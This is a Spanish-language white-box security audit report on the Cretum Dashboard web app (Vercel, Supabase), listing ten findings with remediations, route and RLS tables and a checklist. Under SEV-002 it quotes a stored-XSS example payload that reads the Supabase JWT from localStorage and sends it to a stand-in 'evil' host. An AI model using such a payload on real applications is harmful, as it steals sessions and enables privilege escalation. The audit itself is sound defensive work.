# 🔒 Reporte de Auditoría de Seguridad
**Proyecto:** Cretum Dashboard (MVP / Cretum Desk) · **Fecha:** 2026-07-06 · **Commit auditado:** `38391bd`
**Repositorio:** `ANGEL-0G/Cretum_Dashboard` (privado) · **Despliegue:** Vercel — `cretumdesk.com` / `eugeniocreixell.com.mx`
**Alcance:** caja blanca, solo lectura. Frontend `public/`, funciones serverless `api/`, migraciones `db/`, config e historial git.

---

## 1. Stack detectado

| Capa | Tecnología | Evidencia |
|---|---|---|
| Frontend | HTML + JS vanilla (sin framework/bundler) | `public/index.html`, `public/app.js` (9086 líneas), `<script src="/app.js">` |
| Backend | Vercel Serverless Functions (`@vercel/node`, ESM) | `vercel.json:13-22`, `api/*.js` |
| Base de datos | Supabase Postgres | `api/_lib/supabase.js`, `db/*.sql`, `@supabase/supabase-js` en `package.json:10` |
| Auth (equipo) | Supabase Auth (JWT Bearer) | `api/_lib/auth.js:20-28`, `sb.auth.getUser(token)` |
| Auth (clientes) | Portal propio: usuario/contraseña + token HMAC-SHA256 | `api/portal.js:41-73` |
| Cache / rate-limit | Upstash Redis (ioredis) | `api/_lib/redis.js`, `package.json:11` |
| Email | Resend API | `api/_lib/email.js:11-24` |
| Integraciones | Dropbox (OAuth refresh token), Google Apps Script (Sheets) | `api/dropbox.js`, `api/sheets.js`, `docs/google-apps-script-sync.gs` |
| Import/scripts | `xlsx`, `pg` (solo build/CLI, no runtime) | `scripts/import_excel.mjs`, `scripts/update_from_csv.mjs` |
| CI/CD | GitHub Actions (cron horario → `/api/reminder`) | `.github/workflows/reminder-hourly.yml` |
| CDN libs | supabase-js, font-awesome, chart.js — todos con SRI | `index.html:9-10`, `app.js:3561` |

**Módulos condicionales:**
- Módulo 4A **Supabase RLS: SÍ** (aplicado).
- Módulo 4B Firebase: **N/A** (no se usa Firebase).
- Módulo 4C ORM tradicional: **N/A parcial** — `pg` solo en scripts CLI de import, no en el runtime web.
- Es un **repo único** (no monorepo).

---

## 2. Resumen ejecutivo

- **Total de hallazgos: 10** — 🔴 0 · 🟠 2 · 🟡 2 · 🔵 6
- Los 3 riesgos más urgentes:
  1. **Stored XSS cross-user vía el campo `unit` de tareas**: texto libre que un editor puede plantar en una tarea/invitación y que se renderiza en `innerHTML` **sin escapar** en la sesión de otro miembro (incluido un admin), donde vive el JWT de Supabase en `localStorage` → robo de sesión / escalada. — **SEV-002 🟠**
  2. **Tablas de datos sensibles fuera de las migraciones** (`form_submissions`, `form_links`, `investment_distributions`): su RLS no es verificable en el repo; si alguna se creó sin RLS, la `anon key` pública (que sí llega al navegador) las lee completas. — **SEV-001 🟠**
  3. **Faltan por completo los headers de seguridad** (CSP, HSTS, X-Frame-Options, nosniff) en `vercel.json` — sin defensa-en-profundidad ante XSS ni anti-clickjacking. — **SEV-003 🟡**
- **Aspectos MUY sólidos** (verificados): NO hay `service_role` en el cliente (`config.js` solo entrega URL + anon key); NO hay secretos hardcodeados ni en el historial de 259 commits; RLS habilitado en TODAS las tablas de las migraciones; **todos los iframes que renderizan HTML de terceros/clientes (portal, preview de dashboards, "Campaña actual") usan `sandbox` sin `allow-same-origin`** (los scripts corren en origen nulo, sin acceso a cookies/localStorage); el hardening del commit `da3155b` está bien aplicado (escape-at-source de `full_name`, `jsArg` para onclick, confinamiento Dropbox `underRoot`, SSRF de logos con redirect manual, `timingSafeEqual` en CRON_SECRET, anti-spoofing en notify-assignment); scrypt + rate-limit + verificación BOLA por dashboard en el portal.

**Verificaciones NO realizadas (honestidad de alcance):**
- **Estado RLS en vivo:** sin acceso a la instancia Supabase; el estado se infiere de las migraciones versionadas. Las tablas ausentes de `db/` (SEV-001) quedan **NO VERIFICADAS**.
- **Cabeceras HTTP en vivo:** no se hizo `curl` al dominio; la evaluación se basa en la ausencia de config en `vercel.json` (Vercel no añade CSP/X-Frame por defecto).
- **Valores de variables de entorno** en Vercel: no accesibles; se auditó su *uso* en código, no sus valores.
- **Origen de `letter_url`/`welcome_letter`** (import Altareturn/admin): no verificable; ver SEV-010.

---

## 3. Hallazgos detallados (ordenados por severidad)

### [SEV-001] 🟠 Tablas con datos sensibles fuera de las migraciones versionadas — RLS no verificable
- **Confianza:** REQUIERE VERIFICACIÓN MANUAL
- **OWASP:** A01:2021 – Broken Access Control / A05:2021 – Security Misconfiguration · **CWE:** CWE-862 Missing Authorization · **API Top 10:** API1:2023 – BOLA (si anon lee)
- **Ubicación:** `api/forms.js:81,90,107,115,164` (`form_links`, `form_submissions`, rpc `form_link_counts`); `public/app.js:2935,3739` (`investment_distributions`). Ninguna aparece en `db/*.sql`.
- **Evidencia:**
  ```
  $ grep -rl 'form_submissions\|investment_distributions' db/   → (sin resultados)
  api/forms.js:115   admin.from('form_submissions').insert({ link_id, token, data: d })  # PII: nombre, email, dirección, teléfono
  public/app.js:2935 sb.from('investment_distributions').select(...)                     # datos financieros de LP, leído desde el navegador con la anon key
  ```
- **Impacto:** en Postgres/Supabase, una tabla creada por SQL Editor tiene **RLS deshabilitado por defecto**. Como estas tablas no están en las migraciones del repo, no hay evidencia de que se les corrió `ENABLE ROW LEVEL SECURITY` + políticas. `investment_distributions` se consulta **directamente desde el cliente** con la `anon key` (pública, expuesta por `/api/config`): si su RLS estuviera apagado, cualquier visitante anónimo leería todas las distribuciones de todos los LPs. `form_submissions` guarda PII de onboarding; sin RLS la anon key también la abre.
- **Remediación:** (1) Versionar las migraciones faltantes en `db/` con `ENABLE ROW LEVEL SECURITY` + políticas (`investment_distributions`: `FOR SELECT TO authenticated`; `form_links`/`form_submissions`: **sin** políticas para `anon`/`authenticated` → solo service-role). (2) Verificar en vivo: `SELECT relname, relrowsecurity FROM pg_class WHERE relname IN ('form_links','form_submissions','investment_distributions');` → todas deben ser `t`. (3) Confirmar `search_path` fijado en `form_link_counts`.
- **Esfuerzo estimado:** bajo (si RLS ya está) / medio (si hay que activarlo).

---

### [SEV-002] 🟠 Stored XSS cross-user vía el campo `unit` de tareas (robo de sesión)
- **Confianza:** CONFIRMADO
- **OWASP:** A03:2021 – Injection (XSS almacenado) · **CWE:** CWE-79 Improper Neutralization of Input During Web Page Generation
- **Ubicación:** entrada libre `#eUnit`/`#pUnit`/`#apUnit` (`app.js:1369,1438,1494`); renderizado a `innerHTML` **sin escapar** en `app.js:538, 634, 824, 891, 960, 1036` (y `1053`). Se propaga cross-user vía invitación (`iv.unit` en `app.js:1378,1547`).
- **Evidencia:**
  ```
  app.js:538  ` · ${iv.total} ${iv.unit || 'unidades'}`            // invitación recibida de OTRO usuario
  app.js:634  `${t.done}/${t.total} ${t.unit} · ${p}%`             // buildLista
  app.js:824  `<div class="kb-prog-label">${t.done}/${t.total} ${t.unit}</div>`  // kanban
  app.js:960  `${task.done}/${task.total} ${task.unit || ''}`       // vista equipo (tareas de terceros)
  ```
  A diferencia de `full_name` (que sí se escapa en la fuente, `app.js:51`), `unit` nunca pasa por `escapeHtml`. `toast()` usa `textContent` (seguro), pero estos son `innerHTML`.
- **Impacto:** un usuario con rol **editor** (RLS `tasks_insert_editor` / `task_invites_insert`) crea una tarea de progreso con `unit = <img src=x onerror="fetch('//evil/?t='+localStorage.getItem('sb-...-auth-token'))">` y la asigna. Cuando la víctima (cualquier miembro, **incluido un admin**) abre su lista/kanban/equipo, el payload ejecuta en el origen `cretumdesk.com`, donde el JWT de Supabase vive en `localStorage` → exfiltración de sesión y **escalada editor→admin**. Cross-user confirmado.
- **Remediación:** envolver `t.unit`/`iv.unit`/`task.unit` en `escapeHtml(...)` en las 6-7 líneas citadas (patrón idéntico al ya usado con `full_name`). Idealmente escapar en la fuente al leer las tareas.
- **Esfuerzo estimado:** bajo.

---

### [SEV-003] 🟡 Ausencia total de headers de seguridad HTTP
- **Confianza:** CONFIRMADO
- **OWASP:** A05:2021 – Security Misconfiguration · **CWE:** CWE-693 Protection Mechanism Failure / CWE-1021 (clickjacking)
- **Ubicación:** `vercel.json` (no existe bloque `"headers"`); `public/*.html` (sin `<meta http-equiv="Content-Security-Policy">`).
- **Evidencia:** `grep -n "headers\|Content-Security\|Strict-Transport\|X-Frame" vercel.json` → *NO headers block*. `grep -i 'content-security-policy' public/*.html` → sin resultados.
- **Impacto:** sin `Content-Security-Policy` no hay mitigación de defensa-en-profundidad ante un XSS como SEV-002 (el JWT vive en `localStorage`). Sin `X-Frame-Options`/`frame-ancestors`, clickjacking. Sin `X-Content-Type-Options: nosniff`, MIME-sniffing. Sin HSTS explícito no se fuerza HTTPS por política.
- **Remediación:** añadir a `vercel.json`:
  ```json
  "headers": [{ "source": "/(.*)", "headers": [
    { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains; preload" },
    { "key": "X-Content-Type-Options", "value": "nosniff" },
    { "key": "X-Frame-Options", "value": "DENY" },
    { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
    { "key": "Permissions-Policy", "value": "geolocation=(), camera=(), microphone=()" },
    { "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co; frame-src 'self'" }
  ]}]
  ```
  (`index.html` usa estilos/handlers inline extensos → la CSP requerirá `'unsafe-inline'` en `style-src` o refactor. `frame-src 'self'` es necesario para los iframes `srcdoc`.)
- **Esfuerzo estimado:** medio (afinar CSP contra inline existente).

---

### [SEV-004] 🟡 Dependencia `xlsx` con vulnerabilidades HIGH sin fix (Prototype Pollution + ReDoS)
- **Confianza:** CONFIRMADO
- **OWASP:** A06:2021 – Vulnerable and Outdated Components · **CWE:** CWE-1395 / CWE-1321 / CWE-1333
- **Ubicación:** `package.json:13` (`"xlsx": "^0.18.5"`), usado en `scripts/import_excel.mjs:14` y `scripts/update_from_csv.mjs:22`.
- **Evidencia:** `npm audit` → `xlsx * — high — Prototype Pollution (GHSA-4r6h-8v6p-xvw6), ReDoS (GHSA-5pgg-2g8v-p4x9). No fix available.`
- **Impacto:** **acotado** — `xlsx` NO se importa en ninguna función serverless (`grep xlsx api/` → vacío); solo lo usan scripts CLI que corre el admin sobre Excel propios/confiables. Sin vector desde internet.
- **Remediación:** migrar a la build oficial (`npm i https://cdn.sheetjs.com/xlsx-latest/xlsx-latest.tgz`) o `exceljs`; ejecutar solo sobre archivos de confianza.
- **Esfuerzo estimado:** bajo.

---

### [SEV-005] 🔵 `Access-Control-Allow-Origin: *` en `/api/tasks`
- **Confianza:** CONFIRMADO
- **OWASP:** A05:2021 – Security Misconfiguration · **CWE:** CWE-942 Overly Permissive CORS
- **Ubicación:** `api/tasks.js:38` (único endpoint con CORS abierto).
- **Impacto:** **bajo** — la autorización es por header `Authorization: Bearer` (no cookies), así que el `*` no habilita CSRF ni robo de sesión (un origen ajeno no posee el JWT ni recibe respuestas con credenciales). Higiene, no exposición directa.
- **Remediación:** restringir a orígenes propios (`cretumdesk.com`, `eugeniocreixell.com.mx`) o eliminar el header si no hay uso cross-origin.
- **Esfuerzo estimado:** bajo.

---

### [SEV-006] 🔵 PII de LPs ampliada a todo usuario autenticado vía service-role (inconsistente con la RLS solo-admin)
- **Confianza:** CONFIRMADO
- **OWASP:** A01:2021 – Broken Access Control · **CWE:** CWE-863 Incorrect Authorization
- **Ubicación:** `api/contacts.js:59-75` (acción `list`); `api/portal.js:158-164` (`admin_list`).
- **Evidencia:** `contacts.js` usa `getSupabaseAdmin()` (service-role, omite RLS) para devolver `lp_contacts` + `campaign_engagement` a **cualquier** autenticado, mientras la RLS de esas tablas es `is_admin()` (`db/04_campaigns.sql`).
- **Impacto:** **bajo y por diseño** (documentado "decididas con el equipo"): amplía lectura de PII a viewers/editores (staff de confianza); excluye `comentarios`. Sin exposición a anónimos ni a clientes.
- **Remediación:** aceptable; si se quiere endurecer, exigir rol `editor+` para esas lecturas.
- **Esfuerzo estimado:** bajo.

---

### [SEV-007] 🔵 Sin `.env.example` ni validación de variables al arranque
- **Confianza:** CONFIRMADO · **OWASP:** A05:2021 · **CWE:** CWE-1059
- **Ubicación:** raíz (no existe `.env.example`); `git ls-files | grep -i example` → vacío. Mitigado por documentación en `README.md:43-47` y por 500s explícitos ante variables faltantes.
- **Impacto:** bajo (higiene/onboarding).
- **Remediación:** agregar `.env.example` con placeholders de todas las variables (`SUPABASE_*`, `RESEND_API_KEY`, `CRON_SECRET`, `PORTAL_JWT_SECRET`, `REDIS_URL`, `DROPBOX_*`, `SHEETS_*`).
- **Esfuerzo estimado:** bajo.

---

### [SEV-008] 🔵 Token del portal sin revocación granular (solo expiración 12 h + flag `active`)
- **Confianza:** CONFIRMADO · **OWASP:** A07:2021 · **CWE:** CWE-613
- **Ubicación:** `api/portal.js:124` (`exp: Date.now() + 12*3600*1000`). Mitigado por revalidación de `active` en cada `view` (`portal.js:133-134`).
- **Impacto:** bajo — un token filtrado vale hasta 12 h salvo desactivación. Firma HMAC-SHA256 timing-safe (`portal.js:66-67`), scrypt (`42-52`) y rate-limit (`107-108`) correctos.
- **Remediación:** opcional — reducir `exp` o añadir `token_version` revocable.
- **Esfuerzo estimado:** bajo.

---

### [SEV-009] 🔵 Deriva de esquema: columnas fuera de las migraciones
- **Confianza:** CONFIRMADO · **OWASP:** A05:2021 · **CWE:** CWE-1059
- **Ubicación:** `public/app.js:5296` (`investors.update({ titular })`); `db/03_csv_columns.sql` menciona `distributed_at` en comentario pero no la crea.
- **Impacto:** bajo (mantenibilidad); la RLS de `investors`/`investments` sí existe → sin escalada.
- **Remediación:** consolidar el DDL real en `db/`.
- **Esfuerzo estimado:** bajo.

---

### [SEV-010] 🔵 Residuales de XSS de bajo riesgo (iframe de plantilla, `err.message`, esquema `javascript:`)
- **Confianza:** CONFIRMADO (a, b) / REQUIERE VERIFICACIÓN MANUAL (c)
- **OWASP:** A03:2021 – Injection · **CWE:** CWE-79 / CWE-83 (esquema en atributo)
- **Ubicación y evidencia:**
  - **(a)** `#campTplFrame` (`index.html:3459`) es el **único** iframe sin `sandbox`; recibe `srcdoc` con `{{LINK}}/{{ANIO}}...` sin escapar (`app.js:9044-9045`). Pero solo previsualiza los inputs **del propio admin en su sesión** → self-XSS admin-only. (La copia que ven los no-admin, `#campActualFrame` `index.html:3250`, y todos los iframes de dashboards/portal —`index.html:3650,3670`, `portal.html:127`, `portal-mvp.html:124`— **SÍ** tienen `sandbox="allow-scripts allow-popups..."` sin `allow-same-origin` → seguros.)
  - **(b)** `Error: ${err.message}` sin escapar en `app.js:3212,5249,5250,5286,5342` (inconsistente: en `322,2104,2577,7979,8491…` sí se escapa). `err.message` rara vez es controlable por atacante.
  - **(c)** `letter_url`/`welcome_letter` van con `escapeHtml` en el `href` (`app.js:3052,2674,5480,5536,5578`), pero `escapeHtml` **no neutraliza** un esquema `javascript:`. Si una de esas URLs almacenadas fuera `javascript:...`, el clic ejecutaría. Origen = import Altareturn/admin (control de atacante bajo).
- **Impacto:** bajo — (a) self-XSS; (b) requiere un mensaje de error reflejando input; (c) requiere una URL maliciosa ya almacenada por un admin.
- **Remediación:** (a) añadir `sandbox=""` a `#campTplFrame`; (b) unificar `escapeHtml(err.message)`; (c) validar `^https?:` antes de renderizar `letter_url`/`welcome_letter` en `href`.
- **Esfuerzo estimado:** bajo.

---

## 4. Mapa de rutas y protección

| Ruta | Método | Clasificación | Mecanismo | Observaciones |
|---|---|---|---|---|
| `/` , `/(.*)` → `index.html` | GET | ✅ PÚBLICA | estático | SPA; los datos requieren login Supabase |
| `/portal`, `/portal-mvp`, `/form` | GET | ✅ PÚBLICA | estático | Login/token propio dentro |
| `/api/config` | GET | ✅ PÚBLICA | ninguno (por diseño) | Solo devuelve URL + **anon key** (seguro) `config.js:12-15` |
| `/api/tasks` | GET/POST | 🔑 API PROTEGIDA | JWT Supabase; POST exige editor/admin | CORS `*` (SEV-005) |
| `/api/reminder` | POST/GET | 🔑 API PROTEGIDA | CRON_SECRET (timing-safe) **o** JWT | Cron→todos; user→propio |
| `/api/dropbox` | GET | 🔑 API PROTEGIDA | JWT Supabase | `underRoot()` confina rutas `dropbox.js:94-101` |
| `/api/sheets` | POST | 🔑 API PROTEGIDA | JWT + rol **admin** | Firma con `SHEETS_SYNC_SECRET` |
| `/api/contacts` | POST | 🔑 API PROTEGIDA | JWT; ownership por responsable | list amplía PII (SEV-006) |
| `/api/notify-assignment` | POST | 🔑 API PROTEGIDA | JWT | actorName del perfil, no del body (anti-spoof) |
| `/api/portal` (login/view) | POST | ✅ PÚBLICA (credencial/token) | scrypt + HMAC + rate-limit + BOLA check | `portal.js:128-143` valida acceso por dashboard |
| `/api/portal` (admin_*) | POST | 🔑 API PROTEGIDA | JWT; save/delete exige editor/admin | `canManage()` `portal.js:77-86` |
| `/api/forms` (meta/submit) | POST | ✅ PÚBLICA (token) | token aleatorio; whitelist + caps + anti-spam | `forms.js:33-38,95-111` |
| `/api/forms` (create/list/delete) | POST | 🔑 API PROTEGIDA | JWT; delete/list filtran por `created_by` (anti-IDOR) | `forms.js:158,174` |
| `/api/logo` | GET | ✅ PÚBLICA | whitelist de host + redirect manual (anti-SSRF) | `logo.js:8-27` |

**IDOR/BOLA:** revisado. `portal view` valida propiedad del dashboard (`portal.js:140-142`); `forms delete/list` filtran por `created_by`; `contacts update/delete` verifican responsable (`contacts.js:99`); `notify-assignment` no filtra el email del destinatario al cliente (`notify-assignment.js:174`). Sin IDOR explotable encontrado.

---

## 5. Autorización a nivel de datos (RLS)

| Tabla | RLS | Políticas | Estado |
|---|---|---|---|
| `profiles` | ✅ | SELECT todos-auth; UPDATE own (rol inmutable por `WITH CHECK`); ALL admin | ✅ Impide auto-promover rol (`01_schema.sql:211-219`) |
| `tasks`, `task_log`, `task_invites` | ✅ | ligadas a owner/from/to; INSERT editor/admin | ✅ (nota: contenido `unit` renderizado sin escapar → SEV-002) |
| `investors`, `contacts`, `companies`, `series`, `investments` | ✅ | SELECT `TO authenticated`; write `is_editor_or_admin()` | ✅ Anon NO lee. Todo el equipo lee todo (intencional) |
| `lp_contacts`, `campaign_engagement`, `apertura_contacts` | ✅ | ALL `is_admin()` | ✅ RLS solo-admin (ampliadas vía service-role en `api/contacts`, SEV-006) |
| `campaign_current` | ✅ | SELECT todos-auth; ALL admin | ✅ |
| `portal_dashboards`, `portal_users`, `portal_access` | ✅ | ALL `is_admin()` | ✅ Portal público accede solo por service-role |
| **`form_links`, `form_submissions`** | **❓ NO VERIFICADO** | sin DDL en el repo | 🟠 SEV-001 |
| **`investment_distributions`** | **❓ NO VERIFICADO** | sin DDL; leída directo desde el cliente | 🟠 SEV-001 |
| Funciones `campaign_ranking()`, `is_admin()`, `handle_new_user()` | — | `SECURITY DEFINER` + `search_path=public`; `REVOKE anon`; devuelve agregados sin email | ✅ Correcto |

**service_role en cliente:** ✅ NO. `getSupabaseAdmin()` solo en `api/*.js` (`supabase.js:37-42`); el frontend recibe solo la `anon key` (`config.js:14`). `grep -rn 'process.env\|service_role' public/` → vacío.

---

## 6. Checklist final

- [x] Variables sensibles solo en entorno, excluidas de git — `.gitignore` cubre `.env*`, seeds PII, `.claude/`
- [x] Sin secretos en el historial de git — verificado con `git log -S service_role/PRIVATE KEY` en 259 commits; ningún `.env/.pem/.key` trackeado
- [x] Sin secretos hardcodeados ni expuestos al cliente — solo la anon key (pública) llega al navegador
- [x] Middleware/guards de auth cubriendo rutas — cada `api/*.js` llama `authenticate()` salvo las públicas por diseño
- [N/A] (Next.js 16+) `proxy.ts` — no es Next.js
- [x] Sin IDOR — queries de recurso filtran por `created_by`/owner/responsable/acceso
- [x] Sin mass assignment — `forms`/`contacts` usan whitelist; `profiles` protege `role` con `WITH CHECK`
- [~] Autorización a nivel de datos — ✅ tablas migradas; ❓ `form_*`/`investment_distributions` (SEV-001)
- [x] Sin credenciales privilegiadas (service_role) en el cliente
- [x] Inputs validados con whitelist/longitud/regex/tipos en endpoints públicos
- [~] Sin inyección/XSS — sin SQLi (SDK parametrizado); **XSS almacenado cross-user en `unit` (SEV-002)**; iframes de terceros correctamente sandboxeados; residuales bajos (SEV-010)
- [~] Headers/CORS/CSRF — **faltan headers (SEV-003)**; CORS `*` solo en tasks (bajo, auth por Bearer); CSRF no aplica (Bearer, no cookies)
- [x] Passwords con algoritmo adaptativo; tokens con CSPRNG — scrypt, `crypto.randomBytes`, `timingSafeEqual`
- [~] Dependencias auditadas — lockfile presente; 1 HIGH (`xlsx`) sin vector de runtime (SEV-004)
- [x] Rate limiting en autenticación — login del portal por IP y por usuario; forms con tope de submissions
- [x] Logs sin datos sensibles; webhooks/sync con firma — errores genéricos al cliente; sheets firma con secret

---

## 7. Anexo — Resumen machine-readable

```json
[
  {"id":"SEV-001","severidad":"alto","owasp":"A01:2021","cwe":"CWE-862","archivo":"api/forms.js / public/app.js","linea":"forms.js:115, app.js:2935","titulo":"Tablas sensibles (form_submissions/investment_distributions) fuera de migraciones; RLS no verificable","confianza":"REQUIERE_VERIFICACION_MANUAL"},
  {"id":"SEV-002","severidad":"alto","owasp":"A03:2021","cwe":"CWE-79","archivo":"public/app.js","linea":"538,634,824,891,960,1036","titulo":"Stored XSS cross-user via campo unit de tareas (robo de sesion, escalada editor->admin)","confianza":"CONFIRMADO"},
  {"id":"SEV-003","severidad":"medio","owasp":"A05:2021","cwe":"CWE-693","archivo":"vercel.json","linea":"0","titulo":"Ausencia total de headers de seguridad (CSP/HSTS/X-Frame/nosniff)","confianza":"CONFIRMADO"},
  {"id":"SEV-004","severidad":"medio","owasp":"A06:2021","cwe":"CWE-1395","archivo":"package.json","linea":"13","titulo":"xlsx con Prototype Pollution + ReDoS (HIGH), sin vector runtime","confianza":"CONFIRMADO"},
  {"id":"SEV-005","severidad":"bajo","owasp":"A05:2021","cwe":"CWE-942","archivo":"api/tasks.js","linea":"38","titulo":"CORS Access-Control-Allow-Origin: * (mitigado por auth Bearer)","confianza":"CONFIRMADO"},
  {"id":"SEV-006","severidad":"bajo","owasp":"A01:2021","cwe":"CWE-863","archivo":"api/contacts.js","linea":"59","titulo":"PII de LPs ampliada a todo autenticado via service-role (por diseno)","confianza":"CONFIRMADO"},
  {"id":"SEV-007","severidad":"bajo","owasp":"A05:2021","cwe":"CWE-1059","archivo":".env.example","linea":"0","titulo":"Sin .env.example ni validacion de env al arranque","confianza":"CONFIRMADO"},
  {"id":"SEV-008","severidad":"bajo","owasp":"A07:2021","cwe":"CWE-613","archivo":"api/portal.js","linea":"124","titulo":"Token de portal sin revocacion granular (mitigado por check active)","confianza":"CONFIRMADO"},
  {"id":"SEV-009","severidad":"bajo","owasp":"A05:2021","cwe":"CWE-1059","archivo":"public/app.js","linea":"5296","titulo":"Columnas (titular/distributed_at) fuera de migraciones - deriva de esquema","confianza":"CONFIRMADO"},
  {"id":"SEV-010","severidad":"bajo","owasp":"A03:2021","cwe":"CWE-79","archivo":"index.html / public/app.js","linea":"index.html:3459, app.js:3212, app.js:3052","titulo":"Residuales XSS: iframe campTplFrame sin sandbox (self-XSS admin), err.message sin escapar, esquema javascript: no neutralizado en letter_url","confianza":"CONFIRMADO"}
]
```
